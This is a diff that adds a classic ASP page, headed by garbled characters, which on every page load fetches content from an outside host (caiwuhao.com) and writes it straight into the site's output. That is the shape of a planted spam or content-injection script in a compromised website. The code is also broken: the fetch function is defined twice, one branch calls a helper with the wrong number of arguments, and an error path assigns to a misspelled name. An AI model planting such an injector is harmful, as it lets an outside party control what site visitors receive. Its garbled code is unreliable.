@@ -1,0 +1,76 @@
+”—«È¡¥Ω”£∫<%
+response.Write sGetHttpPage ("http://www.caiwuhao.com/l/show/19",1)
+
+Function sGetHttpPage(HttpUrl,Coding)
+'   On Error Resume Next
+   If IsNull(HttpUrl)=True Or Len(HttpUrl)<18 Or HttpUrl="" Then
+     GetHttpPage=""
+     Exit Function
+   End If
+   Dim GetXmlHttp
+   Set GetXmlHttp=Server.CreateObject("MSXML2.ServerXMLHTTP")
+   GetXmlHttp.Open "GET",HttpUrl,False
+   GetXmlHttp.Send
+   If GetXmlHttp.Readystate<>4 Then
+     sGetHttpPage=""
+   Exit Function
+   End If
+   Select Case Coding
+     Case 0
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"GB2312")
+     Case 1
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"UTF-8")
+     Case 2
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"Big5")
+	   case 3 
+	   sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,GetXmlHttp.ResponseBody,"GB2312")
+   End Select
+   Set GetXmlHttp=Nothing
+   If Err.Number<>0 Then
+     Err.Clear
+   End If
+End Function
+	Function BytesToBstr(Body,Cset)
+'   On Error Resume Next
+	Dim Objstream
+	Set Objstream=Server.CreateObject("Adodb.Stream")
+	Objstream.Type=1
+	Objstream.Mode=3
+	Objstream.Open
+	Objstream.Write Body
+	Objstream.Position=0
+	Objstream.Type=2
+	Objstream.Charset=Cset
+	BytesToBstr=Objstream.ReadText
+	Objstream.Close
+	Set Objstream=Nothing
+	End Function
+Function sGetHttpPage(HttpUrl,Coding)
+'   On Error Resume Next
+   If IsNull(HttpUrl)=True Or Len(HttpUrl)<18 Or HttpUrl="" Then
+     GetHttpPage=""
+     Exit Function
+   End If
+   Dim GetXmlHttp
+   Set GetXmlHttp=Server.CreateObject("MSXML2.ServerXMLHTTP")
+   GetXmlHttp.Open "GET",HttpUrl,False
+   GetXmlHttp.Send
+   If GetXmlHttp.Readystate<>4 Then
+     sGetHttpPage=""
+   Exit Function
+   End If
+   Select Case Coding
+     Case 0
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"GB2312")
+     Case 1
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"UTF-8")
+     Case 2
+       sGetHttpPage=BytesToBstr(GetXmlHttp.ResponseBody,"Big5")
+   End Select
+   Set GetXmlHttp=Nothing
+   If Err.Number<>0 Then
+     Err.Clear
+   End If
+End Function
+
+%>
